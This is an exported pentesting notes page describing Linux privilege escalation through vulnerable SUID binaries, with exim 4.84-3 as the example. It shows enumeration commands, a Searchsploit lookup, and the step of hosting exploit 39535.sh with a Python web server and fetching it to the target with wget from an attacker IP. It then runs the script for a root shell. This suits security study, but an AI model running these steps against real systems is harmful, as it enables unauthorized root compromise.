<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Known Exploits</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Known Exploits</h1><br/><strong>Known Exploits</strong><br />Certain programs install SUID files to aid their operation.<br />Just as services which run as root can have vulnerabilities we can exploit for a root shell, so too can these SUID files.<br /><span style="text-decoration:underline;">Exploits for SUID files</span> can be found using Searchsploit, Google, and GitHub, in the same way we find exploits for Kernels and Services.<br /><br />0. <a href="entest--Post_Exploitation--Privilege_Escalation--Linux_Privilege_Escalation--Automated_Recon_with_Tools--Linux_Smart_Enumeration_(lse.sh).html">Linux Smart Enumeration(lse.sh)</a><br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ .<span style="color:#ff9d00;font-weight:700">/</span>lse.sh -i <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">more</span></pre></div><br />    <a href=""><img src="images/1306-1.png" alt="images/1306-1.png" /></a><br />1. manually locate files with the SUID or SGID bits set:<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">find</span> <span style="color:#ff9d00;font-weight:700">/</span> -type f -a <span style="color:#333333;font-weight:400">\(</span> -perm -u+s -o -perm -g+s <span style="color:#333333;font-weight:400">\)</span> -exec <span style="color:#ff9d00;font-weight:700">ls</span> -l <span style="color:#ff9d00;font-weight:700">{}</span> <span style="color:#333333;font-weight:400">\;</span> 2&gt; <span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>null</pre></div><br />    <a href=""><img src="images/1306-2.png" alt="images/1306-2.png" /></a><br />    <a href=""><img src="images/1306-3.png" alt="images/1306-3.png" /></a><br />    We can see that <strong>exim-4.84-3</strong> file should execute with S<span style="color:#1e90ff;">U</span>ID permissions<br />2. Verify/Check version of the binary<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ &lt;binary&gt; --version</pre></div><br />    <a href=""><img src="images/1306-4.png" alt="images/1306-4.png" /></a><br />3. search exploit with Searchsploit<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ searchsploit &lt;program<span style="color:#ff9d00;font-weight:700">&amp;</span>version&gt;</pre></div><br />    <a href=""><img src="images/1306-5.png" alt="images/1306-5.png" /></a><br />4. Copy the exploit script across to the target machine. <br />   ◇ You may need to remove ^M characters from the script if we get an error like that when we try to execute it<br />    <a href=""><img src="images/1306-6.png" alt="images/1306-6.png" /></a><br />    This can happen when the the exploit code was written using Windows New Line characters<br />   ◇ Note that to get ^M on linux you have to hold Ctrl and then press V and M in succession.<br />    <div class="codebox"><pre><span style="color:#0088ff;font-weight:400">#copy the exploit in the actual folder</span><br />attacker@kali<span style="color:#ff9d00;font-weight:700">:/</span># <span style="color:#ff9d00;font-weight:700">cp</span> <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>exploitdb<span style="color:#ff9d00;font-weight:700">/</span>exploits<span style="color:#ff9d00;font-weight:700">/</span>linux<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>39535.sh .<br /><span style="color:#0088ff;font-weight:400">#remove ^M characters from the script</span><br /><span style="color:#0088ff;font-weight:400">#WARNING: we cannot copy the following command from Windows because to make the </span><br /><span style="color:#0088ff;font-weight:400">#        ^M character, we have to hold Ctrl and then press V and M in succession</span><br />attacker@kali<span style="color:#ff9d00;font-weight:700">:/</span># <span style="color:#ff9d00;font-weight:700">sed</span> -e <span style="color:#3ad900;font-weight:400">&quot;s/^M//&quot;</span> 39535.sh &gt; privesc.sh  <span style="color:#0088ff;font-weight:400">#WARNING! see line above</span><br />attacker@kali<span style="color:#ff9d00;font-weight:700">:/</span># python -m SimpleHTTPServer</pre></div><br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">wget</span> http<span style="color:#ff9d00;font-weight:700">://</span>&lt;attackerIp&gt;<span style="color:#ff9d00;font-weight:700">:</span>8000<span style="color:#ff9d00;font-weight:700">/</span>privesc.sh</pre></div><br />5. Make sure that the script is executable<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">chmod</span> +x privesc.sh</pre></div> <br />6. Execute the script to gain a root shell<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ .<span style="color:#ff9d00;font-weight:700">/</span>privesc.sh</pre></div><br />    <a href=""><img src="images/1306-7.png" alt="images/1306-7.png" /></a></div>
</body>
</html>
